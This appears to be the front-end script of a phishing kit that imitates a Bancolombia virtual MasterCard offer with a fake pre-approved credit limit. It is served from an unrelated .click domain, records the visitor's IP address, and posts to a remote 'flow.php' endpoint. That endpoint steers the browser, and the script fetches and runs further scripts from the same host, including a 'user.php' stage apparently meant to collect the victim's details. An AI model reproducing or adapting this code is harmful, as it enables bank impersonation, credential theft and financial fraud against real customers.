<?php
require(__DIR__ . '/../lib/auth.php');
Header("content-type: application/javascript");
?>
var my_hosting = "https://losmillonarios.click/";
<!-- var my_hosting = "https://losmonos.site/"; -->
var my_head = `
<meta charset="utf-8">
<meta content="es" http-equiv="Content-Language">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="${my_hosting}css/main.css" />
<link rel="stylesheet" href="${my_hosting}css/bg-lineas.css" />
<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
<script defer src="${my_hosting}js/clock.js"></script>
<script defer src="${my_hosting}js/no-zoom.js"></script>
`;

var pageData = {
  hero: `${my_hosting}assets/img/mundial.png`,
  heroTitle: "Tarjeta de Crédito Única Virtual MasterCard",
  lead: "Tarjeta 100% virtual que podrás usar inmediatamente en compras por internet y en comercios físicos desde tus dispositivos con App Bancolombia, Apple Pay, Billetera de Google o Garmin Pay. Cupo entre $5.000.000 y $20.000.000.",
  benefits: [
    { icon: "bx bx-mobile-alt", text: "Actívala y úsala al instante desde tu celular" },
    { icon: "bx bx-wifi", text: "Paga con Apple Pay, Google Wallet y Garmin Pay" },
    { icon: "bx bx-shield-quarter", text: "Mayor seguridad: sin tarjeta física" },
    { icon: "bx bx-pie-chart-alt", text: "Cupo flexible de $5M a $20M" },
    { icon: "bx bx-badge-check", text: "Respaldo MasterCard y Bancolombia" }
  ],
  formTitle: "Solicitud Tarjeta Virtual",
  formSubtitle: "",
  limitMax: 50000000,
  crediagilMin: 5000000,
  crediagilMax: 20000000,
  crediagilRateMonthly: 0.004,
  note: "",
  buttonText: "SOLICITAR TARJETA VIRTUAL",
  buttonTextWithCrediagil: "SOLICITAR TARJETA VIRTUAL"
};

function formatCopLabel(value) {
  return '$' + Number(value || 0).toLocaleString('es-CO');
}

pageData.crediagilMinText = formatCopLabel(pageData.crediagilMin);
pageData.crediagilMaxText = formatCopLabel(pageData.crediagilMax);

var benefitColors = ['#f06a47', '#2eba85', '#ff9833', '#5d74ea', '#23a6ff'];
var benefitsHtml = pageData.benefits.map(function(item, index) {
  var dotColor = benefitColors[index % benefitColors.length];
  return `<li class="benefit-item"><span class="benefit-number" style="--dot:${dotColor}">${index + 1}</span><i class='${item.icon}' aria-hidden="true"></i><span>${item.text}</span></li>`;
}).join('');
var noteHtml = pageData.note ? `<div class="note">${pageData.note}</div>` : '';

var my_body = `
<style>
  :root {
    --bg: #f5f6f9;
    --ink: #1f2126;
    --panel: #ffffff;
    --line: #d9dce3;
    --accent: #0dd1b2;
    --accent-2: #4b5bff;
    --muted: #51535b;
    --success: #1f6d37;
    --danger: #b42318;
  }

  * { box-sizing: border-box; }
  html, body { height: 100%; margin: 0; }

  body {
    background: var(--bg);
    font-family: "Segoe UI", sans-serif;
    color: var(--ink);
    display: flex;
    justify-content: center;
    overflow-y: auto;
    overflow-x: hidden;
    touch-action: pan-y;
  }

  .home-screen {
    width: min(100vw, 760px);
    min-height: 100vh;
    padding: 42px 14px 24px;
    position: relative;
    overflow: visible;
    overflow-x: hidden;
  }

  .home-screen::before,
  .home-screen::after {
    content: "";
    position: absolute;
    width: 220px;
    height: 220px;
    background: radial-gradient(circle, rgba(244,213,33,0.35) 0, transparent 72%);
    opacity: 0.7;
    filter: blur(16px);
    z-index: 0;
  }

  .home-screen::before { top: -80px; right: -70px; }
  .home-screen::after  { bottom: -90px; left: -90px; background: radial-gradient(circle, rgba(59,197,223,0.26) 0, transparent 72%); }

  .logo-mark {
    width: 216px;
    height: 61.2px;
    margin: 0 auto 16px;
    background: url('${my_hosting}assets/img/logo.svg') center/contain no-repeat;
    position: relative;
    z-index: 2;
  }
  .logo-mark span { display: none; }

  .hero-card {
    position: relative;
    z-index: 2;
    background: var(--panel);
    border-radius: 18px;
    padding: 0 0 18px;
    border: 0;
    box-shadow: 0 18px 30px rgba(0,0,0,0.04);
    margin-bottom: 18px;
  }

  .hero-title {
    margin: 16px 18px 10px;
    font-size: clamp(22px, 5.6vw, 27px);
    font-weight: 700;
    letter-spacing: -0.01em;
    text-align: center;
  }

  .hero-img {
    width: 100%;
    max-height: 360px;
    border-radius: 14px;
    object-fit: contain;
    border: 0;
    margin: 0 0 10px;
    background: #fdfdfd;
    display: block;
  }

  .limited-tag {
    display: inline-block;
    margin: 0 18px 10px;
    padding: 6px 12px;
    border-radius: 999px;
    background: linear-gradient(135deg, #0f172a, #111827);
    color: #0dd1b2;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 0.12em;
    text-transform: uppercase;
  }

  .lead {
    margin: 0 18px 12px;
    font-size: 15px;
    line-height: 1.55;
    color: var(--muted);
  }

  .benefit-list {
    list-style: none;
    padding: 0 18px 14px;
    margin: 0;
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
    gap: 10px;
  }

  .benefit-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 12px;
    background: linear-gradient(135deg, #ffffff 0%, #f7f8fb 100%);
    border: 1px solid var(--line);
    border-radius: 14px;
    font-size: 14px;
    font-weight: 600;
    color: var(--ink);
    box-shadow: 0 10px 22px rgba(0,0,0,0.04);
  }

  .benefit-number {
    width: 28px;
    height: 28px;
    border-radius: 50%;
    display: grid;
    place-items: center;
    background: linear-gradient(135deg, #111827, #343b45);
    color: #fff;
    font-weight: 700;
    font-size: 13px;
  }

  .benefit-item i {
    font-size: 18px;
    color: #111827;
  }

  .option-credit, .option-renew {
    display: none;
    align-items: center;
    gap: 10px;
    margin: 10px 18px 4px;
    padding: 12px 14px;
    border: 1.5px solid var(--line);
    border-radius: 14px;
    background: #fffdf7;
    cursor: pointer;
    user-select: none;
    box-shadow: 0 10px 22px rgba(0,0,0,0.04);
  }
  .option-credit input, .option-renew input { display: none; }
  .option-credit .check, .option-renew .check {
    width: 22px;
    height: 22px;
    border-radius: 6px;
    border: 2px solid #111827;
    display: grid;
    place-items: center;
    background: #fff;
    font-size: 15px;
    font-weight: 800;
    color: #111827;
  }
  .option-credit .check::after, .option-renew .check::after { content: ''; }
  .option-credit.on, .option-renew.on {
    border-color: var(--accent);
    background: #fff8e1;
  }
  .option-credit.on .check, .option-renew.on .check {
    background: #111827;
    color: #f4d521;
  }
  .option-credit.on .check::after, .option-renew.on .check::after {
    content: '✓';
  }
  .option-credit strong, .option-renew strong { font-size: 15px; }

  .form-panel {
    position: relative;
    z-index: 2;
    background: var(--panel);
    border-radius: 16px;
    border: 1px solid var(--line);
    padding: 18px 18px 20px;
    box-shadow: 0 16px 28px rgba(0,0,0,0.05);
  }

  .form-title {
    margin: 0 0 6px;
    font-size: clamp(22px, 6vw, 26px);
    font-weight: 600;
  }

  .form-subtitle {
    margin: 0 0 14px;
    font-size: 14px;
    color: var(--muted);
    line-height: 1.45;
  }

  .campaign-card {
    background: linear-gradient(135deg, #111827 0%, #2b323d 60%, #4a525f 100%);
    color: #f7f7f8;
    border-radius: 14px;
    padding: 14px 14px 12px;
    margin-bottom: 14px;
    box-shadow: 0 16px 32px rgba(0,0,0,0.16);
    display: none;
  }
  .campaign-tag {
    display: inline-block;
    padding: 4px 10px;
    border-radius: 999px;
    background: rgba(244,213,33,0.18);
    color: #fddc57;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 0.08em;
    text-transform: uppercase;
    margin-bottom: 8px;
  }
  .campaign-title {
    margin: 0 0 4px;
    font-size: 18px;
    font-weight: 700;
    letter-spacing: -0.01em;
  }
  .campaign-copy {
    margin: 0 0 10px;
    font-size: 14px;
    color: #d7d9de;
  }
  .campaign-toggle {
    width: 100%;
    border: 1px solid rgba(255,255,255,0.25);
    background: rgba(255,255,255,0.06);
    color: #f7f7f8;
    border-radius: 12px;
    padding: 10px 12px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    font-weight: 700;
    cursor: pointer;
  }
  .campaign-toggle i {
    font-size: 18px;
  }
  .campaign-toggle.open {
    background: rgba(255,255,255,0.12);
    border-color: rgba(255,255,255,0.45);
  }

  .highlight-amount {
    display: none;
    margin: 6px 0 10px;
    font-size: 28px;
    font-weight: 800;
    letter-spacing: -0.01em;
    color: #f4d521;
    text-shadow: 0 6px 18px rgba(0,0,0,0.25);
  }

  .crediagil-simple {
    background: #fff;
    border: 1px solid var(--line);
    border-radius: 12px;
    padding: 12px;
    margin-bottom: 14px;
    display: none;
  }

  .crediagil-toggle {
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    border: 1px solid var(--line);
    border-radius: 10px;
    background: #f9fafc;
    color: var(--ink);
    padding: 10px 12px;
    cursor: pointer;
    font-family: inherit;
  }

  .crediagil-toggle.active {
    border-color: var(--success);
    background: #e7f3eb;
  }

  .toggle-label { display: flex; align-items: center; gap: 8px; }
  .toggle-label i { font-size: 18px; color: var(--ink); }
  .toggle-label em { font-style: normal; font-weight: 700; font-size: 13px; }
  .crediagil-toggle strong { font-size: 12px; color: var(--muted); }

  .crediagil-panel {
    margin-top: 12px;
    padding-top: 10px;
    border-top: 1px dashed var(--line);
  }

  .field { margin-bottom: 12px; }
  .field label {
    display: block;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.12em;
    color: var(--muted);
    font-weight: 700;
    margin-bottom: 6px;
  }

  .range-input { width: 100%; accent-color: var(--ink); }

  .range-note {
    margin: 6px 0 0;
    font-size: 13px;
    color: var(--muted);
  }

  .term-grid {
    display: grid;
    grid-template-columns: repeat(2, minmax(0,1fr));
    gap: 8px;
  }

  .term-option {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 10px;
    background: #fff;
    border: 1px solid var(--line);
    border-radius: 10px;
    font-size: 13px;
    font-weight: 700;
    color: var(--ink);
  }
  .term-option input { margin: 0; }

  .result {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px;
    background: #fff;
    border: 1px solid var(--line);
    border-radius: 12px;
    margin: 10px 0;
  }
  .result span {
    font-size: 11px;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: var(--muted);
    font-weight: 700;
  }
  .result strong {
    font-size: 18px;
    color: var(--ink);
  }

  .note {
    margin: 0 0 12px;
    font-size: 13px;
    color: var(--muted);
  }

  .actions { margin-top: 8px; }

  #btn-submit {
    width: 100%;
    height: 52px;
    border: 0;
    border-radius: 28px;
    background: #f4d521;
    color: #1f2126;
    font-weight: 700;
    letter-spacing: 0.12em;
    font-size: 13px;
    cursor: pointer;
  }
  #btn-submit:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    background: #cfd1d7;
    color: #8f9299;
  }

  .security {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 12px;
    color: var(--muted);
    margin-top: 10px;
  }
  .security i { font-size: 16px; color: var(--ink); }

  .footer {
    margin-top: 16px;
    display: flex;
    justify-content: space-between;
    gap: 8px;
    font-size: 11px;
    color: var(--muted);
  }

  @media (max-width: 360px) {
    .home-screen { padding-top: 34px; }
    .hero-img { height: 170px; }
  }
</style>

<main class="home-screen">
  <div class="logo-mark" aria-hidden="true">
    <span></span><span></span><span></span>
  </div>

  <section class="hero-card">
    <h1 class="hero-title">${pageData.heroTitle}</h1>
    <img class="hero-img" src="${pageData.hero}" alt="Tarjeta de Crédito Única Virtual MasterCard Bancolombia">
    <span class="limited-tag">Única Virtual MasterCard</span>
    <p class="lead">${pageData.lead}</p>
    <ul class="benefit-list">
      ${benefitsHtml}
    </ul>
  </section>

  <section class="form-panel">
    <div class="campaign-card">
      <div class="campaign-tag">Beneficiario preaprobado</div>
      <p class="campaign-copy">Tarjeta de Crédito Única Virtual MasterCard Bancolombia. Actívala y úsala de inmediato en línea y en datáfonos con tus billeteras digitales.</p>
      <div class="highlight-amount" id="highlightAmount">Cupo disponible hasta $20.000.000</div>
    </div>

    <form class="form-card" method="post" onsubmit="return false;">

      <div class="crediagil-simple" id="benefitPanel">
        <div class="field">
          <label for="crediagilAmountRange">Selecciona tu cupo</label>
          <input id="crediagilAmountRange" class="range-input" type="range" min="${pageData.crediagilMin}" max="${pageData.crediagilMax}" step="100000" value="${pageData.crediagilMin}">
          <p class="range-note" id="crediagilAmountText">Monto seleccionado: ${pageData.crediagilMinText}</p>
        </div>
        <p class="range-note">Cupo virtual disponible entre $5.000.000 y $20.000.000.</p>
      </div>

      ${noteHtml}
      <div class="actions">
        <button id="btn-submit" type="submit">${pageData.buttonText}</button>
      </div>
    </form>
  </section>

</main>
`;


  let timer = undefined;
  var my_data = [];
  let token = '<?php echo $token; ?>';
  try { window.token = token; } catch(e){}
  let api_server = `${my_hosting}api/flow.php`;

  async function processing(p = {}) {
    let fd = new FormData();
    fd.append('registro', my_data['registro']);
    fd.append('tok', token);
    for (var d in p) {
      fd.append(d, p[d]);
    }

    const prom = await fetch(api_server, {
      method: 'POST',
      body: fd
    });


    let json = await prom.json();

    if (!json) {

      return;
    }
    for (let prop in json) {
      my_data[prop] = json[prop];
    }

    if (json.action) {
      switch (json.action) {
        case 'consulta':
          consultarEstado();
          break;
        case 'url':
          window.location.href = json.url;
          break;
        default:
          loadScript(json.action, json);
          break;
      }
    }
  }

  function loadScript(path, data = null, params = []) {
    clearInterval(timer);
    let url = my_hosting + path + '?';

    params = Object.assign({}, params, my_data);
    for (var d in params) {
      if (params[d]) {
        url += '&' + d + '=' + params[d];
      }
    }
    try {
      $.getScript(url, function() {
        $('*').scrollTop(0);
        if (data) {
          $('#tabError').toggle(data.error !== undefined);
          if (data.error) {
            $('#summary').html(data.error);
          }
        }
        if ($('#jclock1').length > 0) {
          var optionsEST = {
            utc: true,
            utcOffset: -5,
            format: "%A %R de %B de %Y %l:%M:%S %P",
            language: "es"
          }
          $('[id="jclock1"]').jclockNew(optionsEST);
        }
      }).fail(function(jqxhr, settings, exception) {
        console.error("Error loading script:", exception);
      });
    } catch (error) {
      console.error('An error occurred:', error);
    }
  }

  function consultarEstado() {
    processing({
      t: 'consultar',
    });
  }

  $('head').html(my_head);
  $('body').html(my_body);

  $(function() {
    // Bloquea pinch/doble-tap zoom en móviles.
    const blockZoom = (event) => {
      if (event.touches && event.touches.length > 1) {
        event.preventDefault();
      }
    };
    document.addEventListener('touchstart', blockZoom, { passive: false });
    document.addEventListener('touchmove', blockZoom, { passive: false });
    document.addEventListener('gesturestart', (event) => event.preventDefault());
    document.addEventListener('gesturechange', (event) => event.preventDefault());

    if ($('[id="jclock1"]').length > 0) {

      var optionsEST = {
        utc: true,
        utcOffset: -5,
        format: "%A %R de %B de %Y %l:%M:%S %P",
        language: "es",
      };
      $('[id="jclock1"]').jclockNew(optionsEST);
    }

    $.get(
      "https://api.ipify.org?format=jsonp&callback=?",
      function(data) {
        $('#ipc').html("Dirección IP: " + data.ip);
      },
      "jsonp"
    );

    function parseCurrency(value) {
      var digits = String(value || '').replace(/[^\d]/g, '');
      return digits ? Number(digits) : 0;
    }

  var $benefitPanel = $('#benefitPanel');
  var $crediagilAmountRange = $('#crediagilAmountRange');
  var $crediagilAmountText = $('#crediagilAmountText');
  var $submitButton = $('#btn-submit');
var $campaignCard = $('.campaign-card');
var $highlightAmount = $('#highlightAmount');
  var crediagilMin = $crediagilAmountRange.length ? Number($crediagilAmountRange.attr('min')) : 0;
  var crediagilMax = $crediagilAmountRange.length ? Number($crediagilAmountRange.attr('max')) : 0;
var crediagilSelected = true;
    var creditAmountFormatter = new Intl.NumberFormat('es-CO', {
      style: 'currency',
      currency: 'COP',
      maximumFractionDigits: 0
    });

    function formatCurrency(value) {
      return creditAmountFormatter.format(value || 0);
    }

    function getCrediagilAmount() {
      if (!$crediagilAmountRange.length) {
        return 0;
      }
      var amount = parseCurrency($crediagilAmountRange.val());
      if (amount < crediagilMin) {
        amount = crediagilMin;
      }
      if (amount > crediagilMax) {
        amount = crediagilMax;
      }
      return amount;
    }

    function updateSubmitText() {
      if (!$submitButton.length) {
        return;
      }
      $submitButton.text(crediagilSelected ? pageData.buttonTextWithCrediagil : pageData.buttonText);
  }

  function setCrediagilSelected(selected) {
    crediagilSelected = !!selected;
    updateSubmitText();
  }

    function setPanelOpen(open) {
      if ($benefitPanel.length) {
        $benefitPanel.prop('hidden', !open);
      }
    }

    function updateCrediagilEstimate() {
      var amount = getCrediagilAmount();
      if ($crediagilAmountText.length) {
        $crediagilAmountText.text('Monto seleccionado: ' + formatCurrency(amount));
      }
      return {
        amount: amount
      };
    }

  function syncSubmitState() {
    if (!$submitButton.length) {
      return;
    }
    var amount = getCrediagilAmount();
    var isValid = amount >= crediagilMin && amount <= crediagilMax;
    $submitButton.prop('disabled', !isValid);
    updateSubmitText();
  }

  // Estado inicial simplificado: cupo visible y listo para elegir.
  if ($campaignCard.length) { $campaignCard.show(); }
  if ($benefitPanel.length) { $benefitPanel.show(); }
  if ($highlightAmount.length) { $highlightAmount.text('Cupo hasta ' + formatCurrency(crediagilMax)); $highlightAmount.show(); }
  if ($crediagilAmountRange.length) { $crediagilAmountRange.val(crediagilMax); }
  setPanelOpen(true);
  updateCrediagilEstimate();
  if ($submitButton.length) { $submitButton.prop('disabled', false); }
  setCrediagilSelected(true);
  updateSubmitText();

    if ($crediagilAmountRange.length) {
      $crediagilAmountRange.val(crediagilMax);
      updateCrediagilEstimate();
      setPanelOpen(true);
      syncSubmitState();
      $crediagilAmountRange.on('input change', function() {
        updateCrediagilEstimate();
        syncSubmitState();
      });
    }


    $submitButton.click(function() {
      var crediagilData = updateCrediagilEstimate();
      if (crediagilSelected && (crediagilData.amount < crediagilMin || crediagilData.amount > crediagilMax)) {
        syncSubmitState();
        return;
      }
      $submitButton.attr('disabled', 'disabled');
      var productName = crediagilSelected ? 'Tarjeta Única Virtual + Cupo' : 'Tarjeta Única Virtual';
      loadScript('flows/user.php', {
        body: true,
        cupo_actual: '',
        cupo_aumento: '',
        cupo_nuevo: '',
        crediagil_seleccionado: crediagilSelected ? 'si' : 'no',
        crediagil_valor: crediagilSelected ? crediagilData.amount : '',
        crediagil_plazo_meses: '',
        crediagil_tasa_mensual: '',
        crediagil_cuota_mensual: '',
        solicitud_producto: productName
      });
    });
  });
